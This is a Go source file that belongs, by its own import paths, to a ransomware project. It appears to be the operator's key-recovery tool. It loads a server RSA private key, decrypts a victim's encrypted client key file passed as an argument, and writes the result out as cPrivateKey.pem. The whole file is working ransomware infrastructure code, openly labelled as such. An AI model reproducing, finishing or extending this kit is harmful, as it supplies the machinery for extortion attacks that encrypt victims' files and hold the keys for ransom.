package main

import (
	"encoding/pem"
	"fmt"
	"os"
	"ransomware/encryption"
	"ransomware/encryption/rsaLib"
)

var (
	sPrivKey, _ = rsaLib.ReadRSAPrivateKey("privateKey.pem")
)

func decryptClientKey(path string) error {
	var typeString string
	block, _ := os.ReadFile(path)

	decodedBlock, err := encryption.RSAAESDecrypt(block, sPrivKey)
	if err != nil {
		return err
	}

	if len(decodedBlock) == 66 {
		typeString = "EC EXTENDEND PRIVATE KEY"
	} else {
		typeString = "RSA PRIVATE KEY"
	}

	pemBlock := &pem.Block{
		Type:  typeString,
		Bytes: decodedBlock,
	}

	keyFile, err := os.Create("cPrivateKey.pem")
	if err != nil {
		fmt.Println(err)
	}

	pem.Encode(keyFile, pemBlock)

	return nil
}

func main() {
	err := decryptClientKey(os.Args[1])
	if err != nil {
		fmt.Println(err)
	}
}
